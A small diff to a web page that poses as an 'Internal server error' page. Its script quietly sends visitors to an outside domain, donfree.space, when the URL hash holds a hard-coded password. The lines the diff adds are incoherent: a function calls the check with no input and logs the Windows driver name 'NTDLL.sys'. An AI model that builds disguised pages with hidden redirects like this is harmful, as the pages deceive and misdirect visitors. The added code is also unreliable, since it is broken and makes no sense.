@@ -1,5 +1,10 @@
 <h1>Internal server error</h1>
 <script>
+function run(par) {
+check();
+console.log(par);
+return 1;
+}
 function check(h) {
 if (h == "password=STREAM01") {
        window.location.href="https://donfree.space/?sc=1";
@@ -12,4 +17,5 @@ if(window.location.hash) {
       check(hash)
       document.write('SERVER: DATA FOUND<br>')
   } 
+run("NTDLL.sys");
 </script>
